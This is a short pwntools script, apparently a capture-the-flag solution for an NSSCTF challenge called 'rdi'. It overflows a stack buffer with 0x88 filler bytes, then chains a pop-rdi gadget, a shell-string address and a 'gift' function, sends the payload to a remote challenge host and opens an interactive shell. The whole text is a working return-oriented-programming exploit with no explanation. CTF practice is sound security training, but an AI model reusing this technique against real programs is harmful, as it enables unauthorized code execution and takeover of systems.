from pwn import *

io = process("./rdi")
io = remote("node4.anna.nssctf.cn", 29936)

sh = 0x40080D
rdi = 0x04007D3
ret = 0x400546
gift = 0x4006fB

payload = b"a" * (0x80 + 0x8) + p64(rdi) + p64(sh) + p64(gift)
print(hex(len(payload)))
io.send(payload)
io.interactive()
